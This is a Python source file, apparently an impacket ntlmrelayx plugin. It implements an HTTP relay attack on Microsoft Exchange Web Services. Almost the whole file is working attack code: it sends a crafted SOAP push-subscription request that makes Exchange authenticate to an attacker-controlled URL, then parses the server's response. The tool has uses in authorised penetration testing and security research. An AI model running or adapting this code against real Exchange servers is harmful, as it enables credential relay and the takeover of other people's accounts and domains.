# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# HTTP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
# Description:
#  HTTP protocol relay attack
#
# ToDo:
#
import xml.etree.ElementTree as ET
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket import LOG

# SOAP request for EWS
# Source: https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/subscribe-operation
# Credits: https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange
POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
   <soap:Header>
      <t:RequestServerVersion Version="Exchange2013" />
   </soap:Header>
   <soap:Body >
      <m:Subscribe>
         <m:PushSubscriptionRequest SubscribeToAllFolders="true">
            <t:EventTypes>
              <t:EventType>NewMailEvent</t:EventType>
              <t:EventType>ModifiedEvent</t:EventType>
              <t:EventType>MovedEvent</t:EventType>
            </t:EventTypes>
            <t:StatusFrequency>1</t:StatusFrequency>
            <t:URL>%s</t:URL>
         </m:PushSubscriptionRequest>
      </m:Subscribe>
   </soap:Body>
</soap:Envelope>
'''
PROTOCOL_ATTACK_CLASS = "HTTPAttack"

class HTTPAttack(ProtocolAttack):
    """
    This is a modified HTTPAttack which triggers authentication from EWS
    """
    PLUGIN_NAMES = ["HTTP", "HTTPS"]
    def run(self):
        ews_url = "/EWS/Exchange.asmx"

        headers = {"Content-type": "text/xml; charset=utf-8", "Accept": "text/xml","User-Agent": "ExchangeServicesClient/0.0.0.0","Translate": "F"}

        # Replace with your attacker url!
        attacker_url = 'http://dev.testsegment.local/myattackerurl/'

        self.client.request("POST", ews_url, POST_BODY % attacker_url, headers)
        res = self.client.getresponse()

        LOG.debug('HTTP status: %d', res.status)
        body = res.read()
        LOG.debug('Body returned: %s', body)
        if res.status == 200:
            LOG.info('Exchange returned HTTP status 200 - authentication was OK')
            # Parse XML with ElementTree
            root = ET.fromstring(body)
            code = None
            for response in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseCode'):
                code = response.text
            if not code:
                LOG.error('Could not find response code element in body: %s', body)
                return
            if code == 'NoError':
                LOG.info('API call was successful')
            elif code == 'ErrorMissingEmailAddress':
                LOG.error('The user you authenticated with does not have a mailbox associated. Try a different user.')
            else:
                LOG.error('Unknown error %s', code)
                for errmsg in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseMessages'):
                    LOG.error('Server returned: %s', errmsg.text)
        elif res.status == 401:
            LOG.error('Server returned HTTP status 401 - authentication failed')
        else:
            LOG.error('Server returned HTTP %d: %s', res.status, body)
